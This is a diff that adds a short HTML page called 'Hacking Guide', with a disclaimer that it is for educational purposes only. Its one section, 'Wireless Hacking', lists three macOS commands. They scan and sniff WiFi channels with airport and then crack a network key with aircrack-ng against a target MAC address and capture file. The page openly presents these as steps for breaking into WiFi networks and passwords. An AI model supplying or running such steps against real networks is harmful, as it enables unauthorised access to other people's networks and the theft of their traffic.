@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Hacking guide to hack passwords, WiFi's and more.">
+    <link href="https://fonts.googleapis.com/css?family=Merriweather|Roboto+Mono" rel="stylesheet">
+    <style type="text/css">
+      h1,h2,h3,h4,h5,h6 {
+        font-family: Arial, 'sans-serif';
+      }
+      p {
+        font-family: 'Merriweather', serif;
+      }
+      code {
+        font-family: 'Roboto Mono', monospace;
+      }
+      small {
+        font-family: 'Merriweather', serif;
+      }
+      div {
+        border: 3px solid black;
+        padding: 10px;
+        max-width: 500px;
+      }
+    </style>
+    <title>Hacking Guide</title>
+  </head>
+  <body>
+    <h1>Hacking Guide</h1>
+    <p>I'm not responsible with anything you did. Just educational purposes.</p>
+<div>
+    <h2>Wireless Hacking</h2>
+    <p>You can hack Wireless via <b>aircrack-ng</b>, in OS X ;</p>
+    <code>sudo airport -s <small>Select the channel you will sniff.</small></code><br>
+    <code>sudo airport en0 <b>or en1</b> sniff [CHANNEL] <small>Start to sniff WiFi networks.</small></code><br>
+    <code>aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] <small>[CAP_FILE] will be located in the /tmp/</small></code>
+</div>
+  </body>
+</html>
